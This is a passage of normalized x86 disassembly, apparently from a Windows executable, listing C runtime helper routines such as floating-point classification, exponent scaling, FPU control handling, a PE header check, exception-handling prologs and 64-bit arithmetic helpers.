mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447b05
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447b34
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7ff00000
mov eax [ ebp + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov cx [ ebp + 0xe ]
mov edx 0x7ff8
and cx dx
cmp cx dx
jne r-xdata
test eax eax
jne r-xdata
inc eax
pop ebp
retn
mov edx 0x7ff0
cmp cx dx
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_447b92
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_447df1
pop ecx
pop ecx
test al 0x90
jne r-xdata
xor eax eax
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_447d27
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
pop ecx
pop ecx
fstp st1
test ah 0x44
jpe r-xdata
fstp st0
fmul [ r--data ]
push ecx
push ecx
fst [ ebp - 0x8 ]
fstp [ esp ]
call sub_447d27
fld [ ebp - 0x8 ]
fucompp
fnstsw ax
pop ecx
pop ecx
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_447bfc
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx 0x7ff00000
fabs
mov eax 0xfff00000
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x14 ] eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fstp st0
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fld [ r--data ]
jmp r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fldz
fld [ ebp + 0x10 ]
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fldz
jmp r-xdata
fstp [ eax ]
fstp st0
fldz
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_447b92
fldz
fld [ ebp + 0x10 ]
pop ecx
pop ecx
fcom st1
mov ecx eax
fnstsw ax
test ah 0x41
jne r-xdata
fcomp st1
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpo r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
cmp ecx 0x1
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
sub_447d3d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
not ecx
xor ecx eax
not eax
and ecx 0x7fffffff
xor ecx eax
mov [ ebp - 0x4 ] ecx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447d6c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx eax
not ecx
xor ecx eax
not eax
and ecx 0x7fffffff
xor ecx eax
mov [ ebp - 0x4 ] ecx
fld [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_447d8f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447db9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
xor eax [ ebp + 0x8 ]
and eax 0x7fffffff
xor eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_447df1
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0xe ]
mov edx 0x7ff0
mov ax cx
and ax dx
cmp ax dx
jne r-xdata
movzx ecx cx
and ecx 0x8000
test ax ax
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_447b34
pop ecx
pop ecx
sub eax 0x1
je r-xdata
fld [ ebp + 0x8 ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
sub eax 0x1
je r-xdata
neg ecx
sbb ecx ecx
and ecx 0xffffff08
lea eax [ ecx + 0x100 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffffe0
lea eax [ ecx + 0x40 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffff90
lea eax [ ecx + 0x80 ]
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
sub eax 0x1
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_447e95
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0xe ]
mov edx 0x7ff8
and ax dx
lea ecx [ edx - 0x8 ]
cmp ax cx
jne r-xdata
cmp ax dx
jne r-xdata
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub_447ecb
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi 0xffff
push edi
push 0x133f
call sub_444eaf
fld [ ebp + 0x8 ]
mov esi eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucomp st1
fnstsw ax
test ah 0x44
jpe r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_447b34
pop ecx
pop ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4479ef
mov eax [ ebp - 0x4 ]
fstp st0
dec eax
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
push edi
push esi
fstp [ ebp - 0xc ]
call sub_444eaf
fld [ ebp - 0xc ]
add esp 0x14
fld [ r--data ]
push esi
sub esp 0x10
fchs
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x4
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push esi
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x8
cmp eax 0x2
jle r-xdata
call sub_4463c1
add esp 0x1c
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push edi
push esi
call sub_444eaf
pop ecx
pop ecx
cmp eax 0x3
je r-xdata
fld [ ebp + 0x8 ]
jmp r-xdata
sub_447fd5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi 0xffff
push edi
push 0x133f
call sub_444eaf
fld [ ebp + 0x8 ]
mov esi eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucomp st1
fnstsw ax
test ah 0x44
jpe r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_447b34
pop ecx
pop ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4479ef
mov ecx [ ebp + 0x10 ]
add esp 0xc
mov edx [ ebp - 0x4 ]
test ecx ecx
jns r-xdata
fstp st0
fld [ ebp + 0x8 ]
fld [ r--data ]
fadd st1
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp edx eax
jg r-xdata
mov eax 0x80000000
sub eax ecx
cmp edx eax
jl r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_44648f
add esp 0x24
push edi
push esi
call sub_444eaf
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
push esi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ r--data ]
fstp [ esp ]
call sub_447d8f
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp ]
push ecx
push ecx
lea eax [ edx + ecx ]
cmp eax 0xa00
jg r-xdata
fldz
fmulp st1
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fild [ ebp + 0x10 ]
sub esp 0x10
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_446777
add esp 0x10
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_447b05
add esp 0xc
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
push eax
push ecx
push ecx
fstp [ esp ]
call sub_447b05
push edi
push esi
fstp [ ebp - 0xc ]
call sub_444eaf
fld [ ebp - 0xc ]
add esp 0x14
jmp r-xdata
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_447b05
add esp 0xc
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_4481db
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
call sub_44843d
pop ecx
push 0x2
movzx esi ax
mov ebx 0x7ff0
pop edi
cmp si di
je r-xdata
test [ ebp + 0xe ] bx
pop edi
pop esi
pop ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4485ec
fld [ ebp + 0x10 ]
pop ecx
cmp ax di
je r-xdata
fld [ ebp + 0x8 ]
pop ebp
retn
push 0x10
call sub_4485be
pop ecx
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
test ah 0x44
jpo r-xdata
fstp st0
xor ecx ecx
inc ecx
cmp si cx
jne r-xdata
test si si
jne r-xdata
mov ax [ ebp + 0xe ]
mov ecx 0xffef
and ax cx
mov [ ebp + 0xa ] 0xffffffff
lea ecx [ ebx - 0x1 ]
fstp st0
or ax cx
fstp st0
mov ecx 0xffff
jmp r-xdata
fcom st1
fnstsw ax
fldz
test ah 0x5
jpe r-xdata
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp + 0xe ] ax
mov [ ebp + 0x8 ] cx
jmp r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
test ah 0x5
jpo r-xdata
mov eax 0x8000
xor eax eax
jmp r-xdata
fstp st0
fstp st0
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st1
fstp st0
mov ax [ ebp + 0xa ]
add ax cx
mov [ ebp + 0xa ] ax
cmp ax cx
jne r-xdata
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
add ax cx
mov [ ebp + 0x8 ] ax
cmp ax cx
jne r-xdata
jmp r-xdata
add [ ebp + 0xa ] 0x1
jne r-xdata
mov ax [ ebp + 0xc ]
add ax cx
mov [ ebp + 0xc ] ax
cmp ax cx
jne r-xdata
add [ ebp + 0x8 ] 0x1
jne r-xdata
add [ ebp + 0xc ] 0x1
jne r-xdata
add [ ebp + 0xe ] cx
jmp r-xdata
mov ax [ ebp + 0xe ]
inc ax
mov [ ebp + 0xe ] ax
movzx eax ax
and eax 0xffff7fff
cmp eax ebx
jne r-xdata
push 0x8
call sub_4485be
pop ecx
jmp r-xdata
sub_448336
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x7ff
movzx edx [ esi + 0x6 ]
mov ecx edx
shr ecx 0x4
and ecx eax
mov [ ebp - 0x4 ] ecx
cmp cx ax
jne r-xdata
test edx 0xffff7fff
jne r-xdata
test dl 0xf
jne r-xdata
mov eax 0x433
sub eax ecx
sub eax [ ebp + 0xc ]
movzx ecx ax
mov ax cx
mov [ ebp - 0x4 ] ecx
test ax ax
jle r-xdata
xor eax eax
cmp [ esi + 0x4 ] ax
jne r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x4 ] ax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
push 0x35
pop edi
cmp di ax
jg r-xdata
cmp [ esi + 0x2 ] ax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x2 ] ax
jne r-xdata
sar ax 0x4
and ecx 0xf
movsx edi ax
movzx edx [ ecx * 2 + r--data ]
mov ecx [ edi * 4 + r--data ]
movzx eax [ esi + ecx * 2 ]
and edx eax
xor eax edx
mov [ ebp - 0x4 ] edx
mov [ esi + ecx * 2 ] ax
mov cx dx
sub edi 0x1
je r-xdata
xor eax eax
and edx 0x8000
mov [ esi + 0x2 ] eax
mov [ esi ] ax
or eax 0xffffffff
mov [ esi + 0x6 ] dx
jmp r-xdata
cmp [ esi ] ax
jne r-xdata
cmp [ esi ] ax
jne r-xdata
or cx [ esi ]
xor eax eax
mov [ esi ] ax
sub edi 0x1
je r-xdata
pop edi
inc eax
jmp r-xdata
or cx [ esi + 0x2 ]
xor eax eax
mov [ esi + 0x2 ] ax
sub edi 0x1
jne r-xdata
xor eax eax
test cx cx
sete al
dec eax
or cx [ esi + 0x4 ]
xor eax eax
mov [ esi + 0x4 ] ax
sub_44843d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi 0x7ff0
movzx eax [ ecx + 0x6 ]
mov edx eax
and edx esi
cmp dx si
pop esi
jne r-xdata
test eax 0xffff7fff
jne r-xdata
test al 0xf
jne r-xdata
xor eax eax
test dx dx
setne al
sub eax 0x2
pop ebp
retn
xor eax eax
cmp [ ecx + 0x4 ] ax
jne r-xdata
push 0x2
pop eax
pop ebp
retn
xor eax eax
cmp [ ecx + 0x4 ] ax
jne r-xdata
cmp [ ecx + 0x2 ] ax
jne r-xdata
cmp [ ecx + 0x2 ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
pop ebp
retn
inc eax
pop ebp
retn
sub_4484a1
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0xff
movzx ecx [ esi + 0x2 ]
mov edx ecx
shr edx 0x7
and edx eax
mov [ ebp - 0x4 ] edx
cmp dx ax
jne r-xdata
test ecx 0xffff7fff
jne r-xdata
test cl 0x7f
jne r-xdata
mov eax 0x96
sub eax edx
sub eax [ ebp + 0xc ]
movzx eax ax
push edi
mov di ax
mov [ ebp - 0x4 ] eax
test di di
jg r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x2
pop eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x18
pop edx
cmp dx di
jg r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
and eax 0xf
sar di 0x4
movzx edx [ eax * 2 + r--data ]
movsx eax di
mov ecx [ eax * 4 + r--data ]
movzx eax [ esi + ecx * 2 ]
and edx eax
xor eax edx
mov [ ebp - 0x4 ] edx
mov [ esi + ecx * 2 ] ax
xor eax eax
mov cx dx
cmp ax di
jge r-xdata
xor eax eax
and ecx 0x8000
mov [ esi ] ax
or eax 0xffffffff
mov [ esi + 0x2 ] cx
jmp r-xdata
pop edi
xor eax eax
test cx cx
sete al
dec eax
or cx [ esi ]
mov [ esi ] ax
sub_448570
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi 0x7f80
movzx eax [ ecx + 0x2 ]
mov edx eax
and edx esi
cmp dx si
pop esi
jne r-xdata
test eax 0xffff7fff
jne r-xdata
test al 0x7f
jne r-xdata
xor eax eax
test dx dx
setne al
sub eax 0x2
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
push 0x2
pop eax
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_4485be
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push 0x1f
push eax
call sub_448671
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4485f7
add esp 0x10
mov esp ebp
pop ebp
retn
sub_4485f7
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
test bl 0x18
je r-xdata
test bl 0x20
je r-xdata
or ebx 0x20
test bl 0x10
je r-xdata
xor eax eax
inc eax
test bl 0x8
je r-xdata
or eax 0x2
test bl 0x4
je r-xdata
or eax 0x4
push esi
mov esi ebx
and esi 0x1
je r-xdata
or eax 0x8
push eax
call sub_446f22
or [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push 0x1f
push eax
call sub_4486a2
add esp 0xc
test esi esi
pop esi
je r-xdata
or eax 0x10
test bl 0x1c
je r-xdata
call sub_430f56
mov [ eax ] 0x21
jmp r-xdata
pop ebx
pop ebp
retn
call sub_430f56
mov [ eax ] 0x22
sub_448671
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
and edi 0x1f
jne r-xdata
push esi
call sub_4472d1
push edi
mov esi eax
call sub_446f22
pop ecx
mov ecx [ ebp + 0x8 ]
and eax esi
pop esi
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
and [ eax ] edi
jmp r-xdata
xor eax eax
pop edi
pop ebp
retn
sub_4486a2
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0xc ] 0x1f
jne r-xdata
push esi
push edi
call sub_4472d1
push [ ebp + 0xc ]
mov esi eax
call sub_446f22
mov ecx [ ebp + 0x8 ]
mov edi eax
not edi
and edi esi
mov ecx [ ecx ]
and ecx eax
or edi ecx
push edi
call sub_4473f9
and edi 0x1f
push edi
call sub_4486f0
add esp 0xc
xor ecx ecx
cmp eax edi
setne cl
pop edi
mov eax ecx
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4486f0
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call sub_448671
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
and eax 0x1f
mov esp ebp
pop ebp
retn
sub_448920
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_448970
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40e520
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_448a30
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_448920
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448a30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_448a98
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_448acc
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_448b03
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_448b3a
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_448b80
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_448c20
push sub_40e520
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_448c80
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_448d60
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_448da0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_448df0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_448e10
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
